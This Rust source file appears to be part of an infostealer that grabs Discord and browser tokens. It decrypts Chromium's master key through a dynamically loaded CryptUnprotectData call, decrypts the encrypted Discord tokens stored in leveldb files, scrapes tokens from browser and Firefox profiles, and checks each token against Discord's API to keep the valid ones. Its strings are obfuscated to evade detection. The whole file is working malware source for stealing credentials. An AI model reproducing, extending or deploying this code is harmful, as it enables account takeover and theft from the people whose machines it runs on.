use serde_json::Value;
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, generic_array::GenericArray};
use aes_gcm::KeyInit;
use std::sync::Arc;
use std::sync::Mutex;
use regex::bytes::Regex;
use rayon::prelude::*;
use std::fs::File;
use std::io::Read;
use tokio;
use obfstr::obfstr as obf;

// Calling Var and Structs
use winapi::shared::minwindef::{DWORD, BOOL};
use winapi::um::dpapi::CRYPTPROTECT_PROMPTSTRUCT;
use winapi::um::wincrypt::{CRYPTOAPI_BLOB, DATA_BLOB};
use winapi::um::winnt::{LPWSTR, PVOID};

use crate::global;
use crate::grabber::utils;

use rayon::prelude::*;
use std::io::{BufRead, BufReader};

pub(crate) fn get_master_key(path: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);

    let lines: Vec<String> = reader.lines().filter_map(|line| line.ok()).collect();

    let master_keys: Vec<Vec<u8>> = lines
        .par_iter()
        .filter_map(|line| {
            let json: Result<Value, _> = serde_json::from_str(line);
            if let Ok(value) = json {
                let encrypted_key = value[obf!("os_crypt")][obf!("encrypted_key")]
                    .as_str()
                    .and_then(|key| global::utils::decode_base64(key).ok())
                    .and_then(|decoded| decoded.get(5..).map(|slice| slice.to_vec()));
                return encrypted_key;
            }
            None
        })
        .collect();


    let handle = global::loader::LoadMod::new(obf!("crypt32.dll")).unwrap();
    let my_crypt_unprotect_data = global::loader::call_function!(
        &handle,
        fn(*mut DATA_BLOB, *mut LPWSTR, *mut DATA_BLOB, PVOID, *mut CRYPTPROTECT_PROMPTSTRUCT, DWORD, *mut DATA_BLOB,) -> BOOL,
        obf!("CryptUnprotectData")
    );

    let decrypted_keys: Vec<Vec<u8>> = master_keys
        .par_iter()
        .map(|encrypted_key| {
            let mut out_data = CRYPTOAPI_BLOB {
                cbData: 0,
                pbData: std::ptr::null_mut(),
            };

            unsafe {
                let _ = my_crypt_unprotect_data(
                    &mut CRYPTOAPI_BLOB {
                        cbData: encrypted_key.len() as u32,
                        pbData: encrypted_key.as_ptr() as *mut _,
                    },
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    0x1,
                    &mut out_data,
                );
                let decrypted_key = Vec::from_raw_parts(
                    out_data.pbData,
                    out_data.cbData as usize,
                    out_data.cbData as usize,
                );
                decrypted_key
            }
        })
        .collect();

    Ok(decrypted_keys.into_iter().flatten().collect())
}

pub(crate) fn decrypt_tokens(buff: &[u8], master_key: &[u8]) -> Result<String, String> {
    // Decrypt the AES 256 Buffer using the master key
    Ok(String::from_utf8_lossy(&Aes256Gcm::new(GenericArray::from_slice(master_key))
    .decrypt(GenericArray::from_slice(&buff[3..15]), &buff[15..])
    .map_err(|_| " ")?.as_slice()).to_string())
}

pub async fn check_token(token: &str) -> Result<(String, String), Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client
        .get(obf!("https://discord.com/api/v9/users/@me"))
        .header(reqwest::header::AUTHORIZATION, token)
        .send()
        .await?;

    let status = response.status().as_str().to_string();
    let user_id = serde_json::from_str::<serde_json::Value>(&response.text().await?)?
        .get(obf!("id"))
        .map(|s| s.as_str().unwrap_or_default())
        .unwrap_or_default()
        .to_string();

    Ok((status, user_id))
}

pub async fn get_discord_tokens(local_state_path: &str, path: &str, encrypted_regex_pattern: &Regex) -> Arc<Mutex<global::utils::Credentials>> {
    let new_credentials = Arc::new(Mutex::<global::utils::Credentials>::new(Default::default()));

    if std::path::Path::new(&local_state_path).exists() {
        let master_key: Vec<u8> = get_master_key(&local_state_path).unwrap();

        std::fs::read_dir(&path).unwrap().par_bridge().filter_map(|entry| {
            let entry = entry.ok()?;
            if let Some(extension) = entry.path().extension().and_then(|ext| ext.to_str()) {
                if extension == obf!("ldb") || extension == obf!("log") {
                    Some(entry)
                } else {
                    None
                }
            } else {
                None
            }
        }).for_each(|entry| {

            let mut content = Vec::new();
            std::io::BufReader::new(std::fs::File::open(&entry.path()).unwrap()).read_to_end(&mut content).unwrap();
            encrypted_regex_pattern.find_iter(&mut content).for_each(|m| {
                if let Ok(bytes) = global::utils::decode_base64(String::from_utf8_lossy(m.as_bytes()).split(obf!("dQw4w9WgXcQ:")).collect::<Vec<_>>()[1]) {
                    if let Ok(token) = decrypt_tokens(&bytes, &master_key) {
                        new_credentials.lock().unwrap().token.push(token);
                    }
                }
            })
        });
    }
    new_credentials
}

pub async fn get_browser_tokens(path : &str, regex_pattern : &Regex, format : &[String]) -> Arc<Mutex<global::utils::Credentials>> {
    if !std::path::Path::new(&path).exists() {
        return Arc::new(Mutex::<global::utils::Credentials>::new(Default::default()));
    }
    let new_credentials = Arc::new(Mutex::<global::utils::Credentials>::new(Default::default()));
    
    std::fs::read_dir(&path).unwrap().par_bridge().filter_map(|entry| {
        let entry = entry.ok()?;
        if let Some(extension) = entry.path().extension().and_then(|ext| ext.to_str()) {
            if format.par_iter().any(|ext| extension.ends_with(ext)) {
                Some(entry)
            } else {
                None
            }
        } else {
            None
        }
    }).for_each(|entry| {

        let mut content = Vec::new();
        std::io::BufReader::new(std::fs::File::open(&entry.path()).unwrap()).read_to_end(&mut content).unwrap();
        regex_pattern.find_iter(&mut content).for_each(|m| {
            new_credentials.lock().unwrap().token.push(String::from_utf8_lossy(&m.as_bytes()).to_string());
        });
    });

    new_credentials
}

pub async fn token_grabber(new_credentials : Arc<Mutex<global::utils::Credentials>>, regex_pattern : regex::bytes::Regex, encrypted_regex_pattern : Regex, tasks : &mut Vec<tokio::task::JoinHandle<()>>) {
    // Iterate over the paths
    for (name, path) in utils::PATHS.iter() {
        if !std::path::Path::new(&path).exists() {
            continue;
        }
        let new_credentials_clone = Arc::clone(&new_credentials);
        let encrypted_regex_pattern_clone = encrypted_regex_pattern.clone();
        let regex_pattern_clone = regex_pattern.clone();

        tasks.push(tokio::spawn(async move {
            if path.contains(obf!("cord")) {
                let discord_tokens = get_discord_tokens(&format!("{}\\{}\\Local State", global::utils::ROAMING.as_str(), name.replace(" ", "")), &path, &encrypted_regex_pattern_clone).await.lock().unwrap().token.clone();
                new_credentials_clone.lock().unwrap().token.extend(discord_tokens);
            } else {
                let browser_tokens = get_browser_tokens(&path, &regex_pattern_clone, &[obf!("log").to_string(), obf!("ldb").to_string()]).await.lock().unwrap().token.clone();
                new_credentials_clone.lock().unwrap().token.extend(browser_tokens);
            }
        }));
    }
    
    // Wait for all tasks to complete
    for task in tasks {
        task.await.unwrap();
    }
    new_credentials.lock().unwrap().token.extend(get_browser_tokens(&format!("{}\\Mozilla\\Firefox\\Profiles", global::utils::ROAMING.as_str()), &regex_pattern, &[obf!("sqlite").to_string()]).await.lock().unwrap().token.clone());
}

pub async fn process_data(new_credentials: Arc<Mutex<global::utils::Credentials>>) {
    // Remove duplicates
    let uncheck_tokens: Vec<String> = global::utils::remove_duplicates(new_credentials.lock().unwrap().token.clone());
    // Clear new credentials fields
    new_credentials.lock().unwrap().token.clear();
    new_credentials.lock().unwrap().id.clear();

    let mut tasks = Vec::new(); // Collect tasks that resolve to Credentials

    // Check if tokens are valid using Threading, Reqwest and async
    for t in uncheck_tokens.iter() {
        let creds = Arc::clone(&new_credentials);
        let t = t.to_string();
        let uncheck_tokens = uncheck_tokens.clone();

        let task = tokio::spawn(async move {
            let unwrapped = check_token(&t).await.unwrap();

            if !uncheck_tokens.contains(&unwrapped.1.clone()) && unwrapped.0 == obf!("200") {
                let mut creds = creds.lock().unwrap(); // Lock the mutex and get a guard
                creds.id.push(unwrapped.1.clone()); // Push Data to Credentials
                creds.token.push(t.clone());
            }
        });

        tasks.push(task);
    }

    // Wait for all tasks to complete
    for task in tasks {
        task.await.unwrap();
    }
}